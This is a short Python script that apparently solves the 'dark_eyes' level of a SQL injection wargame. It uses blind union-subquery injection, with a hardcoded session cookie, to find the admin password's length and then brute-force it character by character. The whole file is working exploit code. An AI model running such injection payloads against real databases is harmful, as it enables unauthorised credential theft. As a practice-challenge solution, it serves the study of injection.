import requests

cookies={'PHPSESSID':'8pt5qvotaijsant070i27b03jq'}
length=3
hex_value="0123456789abcdefghijklmnopqrstuvwxyz"
while True:
    address="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
    url=address+ "?pw= 'or id='admin' and (select 1 union select (length(pw)="+str(length)+"))%23"
    res=requests.get(url,cookies=cookies)
    length+=1

    if res.text:
        length-=1
        print("pw는 "+str(length)+"자리")
        break
    else:
        print(str(length-1)+": X")

i=length
pw=""
for a in range(1,i+1):
    for b in range(33,128):
        url = address + "?pw= 'or id='admin' and (select 1 union select (ascii(substr(pw,"+str(a)+",1))="+str(b)+"))%23"
        res=requests.get(url,cookies=cookies)

        if res.text:
            print(str(a)+"of pw=>"+chr(b))
            pw+=chr(b)
            break
print(pw)

